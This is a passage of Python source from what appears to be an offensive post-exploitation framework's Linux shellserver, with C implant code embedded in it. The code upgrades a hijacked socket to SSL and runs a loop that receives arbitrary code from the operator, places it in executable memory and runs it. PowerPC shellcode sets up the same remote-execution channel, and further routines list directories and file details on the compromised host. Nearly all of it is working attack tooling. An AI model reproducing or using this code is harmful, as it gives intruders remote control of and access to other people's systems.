        #import "local",  "fcntl"       as "fcntl"
        #import "local",  "sendint"     as "sendint"
        #import "local",  "sendpointer" as "sendpointer"
        #import "local",  "munmap"      as "munmap"
        #import "local",  "mmap"        as "mmap"
        #import "local",  "exit"        as "exit"
        #import "local",  "callptr"     as "callptr"
        #import "local",  "debug"       as "debug"

        #import "int",    "FD"          as "FD"
        #import "int",    "F_SETFL"     as "F_SETFL"
        #import "int",    "F_GETFL"     as "F_GETFL"
        #import "int",    "O_NONBLOCK"  as "O_NONBLOCK"
        #import "int",    "O_BLOCK"     as "O_BLOCK"

        #import "int",    "PROT_READ"   as "PROT_READ"
        #import "int",    "PROT_WRITE"  as "PROT_WRITE"
        #import "int",    "PROT_EXEC"   as "PROT_EXEC"
        #import "int",    "MAP_PRIVATE" as "MAP_PRIVATE"
        #import "int",    "MAP_ANON"    as "MAP_ANON"
        #import "int",    "MAP_FAILED"  as "MAP_FAILED"

        struct timeval {
            int sec;
            int usec;
        };

        void main()
        {
            void *m;
            void *ctx;
            void *ssl;
            void *method;
            char *p;

            int ret;
            int len;
            int left;

            int timeout;
            int connected;
            int opts;

            struct timeval tv;


            SSL_library_init();
            method = SSLv3_method();

            ctx = SSL_CTX_new(method);
            ssl = SSL_new(ctx);

            sendpointer(ssl);
            SSL_set_fd(ssl, FD);

            // Turn on non-blocking mode since SSL_connect can block forever
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts | O_NONBLOCK;
            fcntl(FD, F_SETFL, opts);

            timeout   = 0;
            connected = 0;

            do {
                tv.sec  = 1;
                tv.usec = 0;

                ret = SSL_connect(ssl);

                if (ret == 1) {
                    connected = 1;
                } else {
                    ret = select(NULL, NULL, NULL, NULL, &tv);
                    timeout = timeout + 1;

                    if (ret == -1) {
                        connected = 2;
                    }

                    if (timeout == TIMEOUT) {
                        connected = 2;
                    }
                }
            } while (connected == 0);


            // Turn off non-blocking mode
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts & O_BLOCK;
            fcntl(FD, F_SETFL, opts);

            if (connected != 1) {
                // Handshake error, need to resynchronize
                // if we want to keep connection/mosdef loop going
                sendint(2864434397);

                do {
                    p = &connected;
                    left = 4;
                    do {
                        ret = read(FD, p, left);

                        if (ret < 0) {
                            exit(1);
                        }

                        left = left - ret;
                        p = p + ret;
                    } while (left > 0);

                } while (connected != 2864434397);
                return;
            }

            // This is the upgraded SSL MOSDEF loop
            while (1) {
                ret  = 0;
                len  = 0;
                left = 4;
                p    = &len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p    = p + ret;
                } while (left > 0);

                m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);

                if (m == MAP_FAILED) {
                    exit(1);
                }

                p = m;
                left = len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);

                callptr(m);
                munmap(m, len);
            }

            exit(0);
        }
        """

        try:
            self.log('[+] Turning on crypto..')
            self.savefunctioncache()
            self.clearfunctioncache()
            request = self.compile(code, vars)
            self.restorefunctioncache()
            self.sendrequest(request)

            self.ssl_ptr = self.readpointer()

            self.leave()
            self.log('[+] SSL pointer: 0x%x' % self.ssl_ptr)
        except ResolveException, ex:
            self.log(str(ex))
            self.log('[+] Aborting crypto setup')
            return False

        return True

    def stat(self, filename):
        return self.__xstat(filename, mode='stat')

    def fstat(self, fd):
        return self.__xstat(fd, mode="fstat")

    def __xstat(self, arg, mode = "fstat"):
        """
        runs [f]stat
        """

        vars={}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode
        vars[d[2]] = arg

        code = """
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendlong" as "sendlong"
        #import "local","%s" as "%s"

        #import "%s", "%s" as "%s"

        void main()
        {
          struct stat buf;
          int ret;
          ret = %s(%s, &buf);

          sendint(ret);

          if (ret == 0)
          {
            sendlong(buf.st_dev);
            sendlong(buf.st_ino);
            sendlong(buf.st_nlink);

            sendint(buf.st_mode);
            sendint(buf.st_uid);
            sendint(buf.st_gid);
            sendlong(buf.st_rdev);
            sendlong(buf.st_size);
            sendlong(buf.st_blksize);
            sendlong(buf.st_blocks);

            sendlong(buf.st_atime);
            sendlong(buf.st_atimensec);
            sendlong(buf.st_mtime);
            sendlong(buf.st_mtimensec);
            sendlong(buf.st_ctime);
            sendlong(buf.st_ctimensec);
          }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        ret     = self.readint(signed=True)
        statbuf = None

        if ret == 0:
            statbuf = self.readstruct([("l","st_dev"),
                                       ("l","st_ino"),
                                       ("l","st_nlink"),
                                       ("i","st_mode"),
                                       ("i","st_uid"),
                                       ("i","st_gid"),
                                       ("l","st_rdev"),
                                       ("l","st_size"),
                                       ("l","st_blksize"),
                                       ("l","st_blocks"),
                                       ("l","st_atime"),
                                       ("l","st_atimensec"),
                                       ("l","st_mtime"),
                                       ("l","st_mtimensec"),
                                       ("l","st_ctime"),
                                       ("l","st_ctimensec")])

        self.leave()
        return ret, statbuf

    def dodir(self, directory):
        """
        List the contents of a directory
        """

        if directory[-1] != "/": directory += "/"
        vars = {'directory' : directory}

        code = """
        #include <stdlib.h>
        #include <sys/stat.h>
        #include <errno.h>
        #include <fcntl.h>

        #import "local", "sendlong" as "sendlong"
        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        #import "local", "getdents" as "getdents"
        #import "local", "open" as "open"
        #import "local", "close_no_eintr" as "close_no_eintr"
        #import "local", "write" as "write"
        #import "local", "strcpy" as "strcpy"
        #import "local", "strcat" as "strcat"
        #import "local", "stat" as "stat"

        #import "string", "directory" as "directory"

        struct dirent {
            unsigned long long d_ino;
            unsigned long long d_off;
            unsigned short d_reclen;
            char  d_name[256];
        };

        void main ()
        {
          int fd;
          int ret;
          int bpos;
          int run;

          char buf[1024];
          char filename[8096];

          struct dirent *dirptr;
          struct stat tats;

          run  = 1;
          fd = open(directory, O_DIRECTORY|O_RDONLY);

          if (fd < 0) {
              sendint(-1);
          } else {
              sendint(fd);

              while (run != 0) {
                   ret = getdents(fd, &buf, 1024);

                   if (ret <= 0) {
                       sendint(ret);
                       close_no_eintr(fd);
                       run = 0;
                   } else {
                       for (bpos = 0; bpos < ret; bpos = bpos + dirptr->d_reclen) {
                           dirptr = buf + bpos;
                           sendint(1);
                           sendstring(dirptr->d_name);

                           strcpy(filename, directory);
                           strcat(filename, dirptr->d_name);
                           stat(filename , &tats);
                           sendint(tats.st_mode);
                           sendint(tats.st_uid);
                           sendint(tats.st_gid);
                           sendlong(tats.st_size);
                           sendlong(tats.st_mtime);
                       }
                   }
              }
          }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        if self.readint(signed=True) < 0:
            self.log('[EE] open(2) failed on %s, aborting' % directory)
            self.leave()
            return []

        files = []

        while self.readint(signed=True) > 0:
            d_name  = self.readstring()
            statbuf = self.readstruct([("i", "st_mode"),
                                       ("i", "st_uid"),
                                       ("i", "st_gid"),
                                       ("l", "st_size"),
                                       ("l", "st_mtime")])
            files.append((d_name, statbuf))

        self.leave()
        return files

    def readpointer(self):
        return self.readlong()

    def shutdown(self):
        """
        close the socket
        """
        self.connection.close()
        return


#### NEW CLASS - PPC ####

from MOSDEF.linuxremoteresolver import ppclinuxremoteresolver
class Linux_ppc(LinuxShellServer, ppclinuxremoteresolver):

    proctype = "PowerPC"

    def __init__(self, connection, node, version = "2.6", logfunction = None, initialisedFD = None):
        ppclinuxremoteresolver.__init__(self, version)
        unixshellserver.__init__(self, connection, type="Active", logfunction = logfunction)
        MSSgeneric.__init__(self, self.proctype)
        self.libraryDict = {}
        self.functionDict = {}
        self.remotefunctioncache = {}
        self.node = node
        self.node.shell = self
        self.started = 0

    def startup(self):
        if self.started:
            return 0
        self.connection.set_timeout(None)

        sc = shellcodeGenerator.linux_ppc()
        if isdebug('linuxshellserver::startup::shellcode_attach'):
            print "[+] attach and press <enter>"
            sys.stdin.read(1)

        if hasattr(self, 'initialisedFD') and self.initialisedFD != None:
            self.fd = self.initialisedFD
        else:
            sc.addAttr("sendreg", {'fdreg': "r28", 'regtosend': "r28"})
            #print shellcode_dump(sc.get(), mode="Risc")
            sc.addAttr("read_exec", {'fdreg': "r28"})
            #print shellcode_dump(sc.get(), mode="Risc")
            getfd = sc.get()
            print shellcode_dump(getfd, mode="Risc")
            self.sendrequest(getfd)
            self.fd = self.readword()
            self.initialisedFD = self.fd
            self.leave()

        self.log("[+] Self.fd = %d" % self.fd)
        self.libc.initStaticFunctions({'fd': self.fd})
        # XXX: because we operate on a copy of the libc localfunctions inside remote resolver
        # XXX: we must now update the remote resolver copy of the localfunctions with a new copy
        self.localfunctions = copy.deepcopy(self.libc.localfunctions)
        # XXX: we must re-call initLocalFunctions to update the rr again ..
        self.initLocalFunctions()

        sc = shellcodeGenerator.linux_ppc()
        sc.addAttr("read_exec_loop", {'fdreg': "r28", 'fdval': self.fd})
        mainloop = sc.get()
        print shellcode_dump(sc.get(), mode="Risc")
        self.log("[+] mainloop length = %d" % len(mainloop))
        self.sendrequest(mainloop)
        self.leave()

        # XXX move to generic
        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')
        self.log("[+] Reset SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)
        self.log("[+] Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)

        (uid,euid,gid,egid) = self.ids()
        self.uid = uid # so we get a nice little '#' prompt from NodePrompt on uid 0

        self.setInfo("Linux/ppc MOSDEF ShellServer. Remote host: %s" % ("*" + str(self.getRemoteHost()) + "*"))
        self.setProgress(100)
        self.started = 1
        return 1

    def stat(self, filename):
        return self.__xstat(filename, mode = "stat")

    def fstat(self, fd):
        return self.__xstat(fd, mode = "fstat")

    def __xstat(self, arg, mode = "fstat"):
        """
        runs [f]stat
        """

        vars={}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode
        vars[d[2]] = arg

        code="""
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","%s" as "%s"
        #import "%s", "%s" as "%s"

        void main()
        {
             // stat is MOSDEFLibc/asm/arch.py dependent!
             struct stat buf;
             int ret;
             int *i;

             ret = %s(%s, &buf);
             sendint(ret);
             if (ret == 0)
             {
               // XXX: mosdef can't handle struct.member[index] yet :(
               // XXX: to fix do like: i = struct.member; i[index]
               sendint(buf.st_dev);
               sendint(buf.st_ino);
               sendint(buf.st_mode);
               sendint(buf.st_nlink);
               sendint(buf.st_uid);
               sendint(buf.st_gid);
               sendint(buf.st_rdev);
               sendint(buf.st_size);
               sendint(buf.st_blksize);
               sendint(buf.st_blocks);
               sendint(buf.st_atime);
               sendint(buf.st_mtime);
               sendint(buf.st_ctime);
             }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        statbuf = None
        if ret == 0:
            statbuf = self.readstruct([("l","st_dev"),
                                      ("l","st_ino"),
                                      ("l","st_mode"),
                                      ("l","st_nlink"),
                                      ("l","st_uid"),
                                      ("l","st_gid"),
                                      ("l","st_rdev"),
                                      ("l","st_size"),
                                      ("l","st_blksize"),
                                      ("l","st_blocks"),
                                      ("l","st_atime"),
                                      ("l","st_mtime"),
                                      ("l","st_ctime")])

        self.leave()
        return ret,statbuf

    #### dependent on local var functions ###

    def shutdown(self):
        """
        close the socket
        """
        self.connection.close()
        return

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        #print "Receiving %d bytes from fd %d"%(length,fd)
        message = self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength = 0
        ret = []
        buffer = self.node.parentnode.recv(self.connection, length)
        self.leave()

        return buffer
